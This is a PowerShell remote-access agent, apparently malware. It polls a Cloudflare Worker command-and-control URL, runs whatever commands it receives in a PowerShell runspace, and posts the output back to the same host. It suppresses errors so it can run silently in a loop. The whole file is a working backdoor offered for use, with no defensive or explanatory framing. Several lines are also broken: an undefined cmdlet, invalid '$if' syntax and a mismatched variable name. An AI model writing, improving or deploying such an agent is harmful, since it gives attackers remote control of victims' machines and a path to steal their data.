# AGENT v2.0 - Aggressive & Reliable
# Designed for Cloudflare Worker C2

$WORKER_BASE = "https://kalcium808.workers.dev" # REPLACE 
$AGENT_ID = "HOST-" + (Get-ComputerName)
$NextOffset = 0
$ErrorActionPreference = "SilentlyContinue" # Prevents script from stopping on error

# Function to get updates from C2
function Get-Commands {
    param([int]$Offset)
    $Uri = "$WORKER_BASE/c2"
    $Body = @{ action = "get_commands"; offset = $Offset } | ConvertTo-Json
    try {
        # Use a shorter timeout to prevent hanging if network is bad
        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 5
        return $Response
    } catch {
        # If network fails, just return empty and retry next loop
        return @{}
    }
}

# Function to send results back
function Send-Result {
    param([string]$AgentId, [string]$Output, [bool]$Success = $true)
    $Uri = "$WORKER_BASE/c2"
    $Body = @{ 
        action = "send_result" 
        agent_id = $AgentId 
        output = $Output 
        status = $if($Success){"OK"}else{"FAIL"}
    } | ConvertTo-Json
    
    try {
        # Fire-and-forget: Don't wait for response to keep the loop fast
        Invoke-WebRequest -Uri $Uri -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 5 -UseBasicParsing | Out-Null
    } catch {}
}

# Main Execution Loop
while ($true) {
    try {
        $Data = Get-Commands -Offset $NextOffset
        
        if ($Data.updates.Count -gt 0) {
            foreach ($Update in $Data.updates) {
                $Command = $Update.message.text.Trim()
                
                # Skip empty commands
                if ([string]::IsNullOrWhiteSpace($Command)) { continue }

                # Execute Command with Error Handling
                $Output = ""
                $ExitCode = 0
                
                try {
                    # Run command in a separate runspace to isolate failures
                    $PowerShell = [System.Management.Automation.PowerShell]::Create()
                    $PowerShell.AddScript($Command)
                    $Results = $PowerShell.Invoke()
                    
                    # Capture Output
                    $Output = ""
                    foreach ($Result in $Results) {
                        $Output += $Result.ToString() + "`n"
                    }
                    
                    # Capture Errors
                    if ($PowerShell.HadErrors) {
                        foreach ($Err in $PowerShell.Streams.Error) {
                            $Output += "[ERROR]: " + $Err.Exception.Message + "`n"
                        }
                        $ExitCode = 1
                    } else {
                        $ExitCode = 0
                    }
                    
                    $PowerShell.Stop()
                } catch {
                    $Output += "[FATAL ERROR]: " + $_.Exception.Message + "`n"
                    $ExitCode = 1
                }

                # Send Result Back
                Send-Result -AgentId $AgentId -Output $Output -Success ($ExitCode -eq 0)
                
                # Update Offset only after successful processing
                $NextOffset = $Data.next_offset
            }
        }
    } catch {
        # If the entire loop crashes, log it and restart after 10 seconds
        Start-Sleep -Seconds 10
    }
    
    # Sleep between polls to avoid rate limits and reduce CPU usage
    Start-Sleep -Seconds 5
}
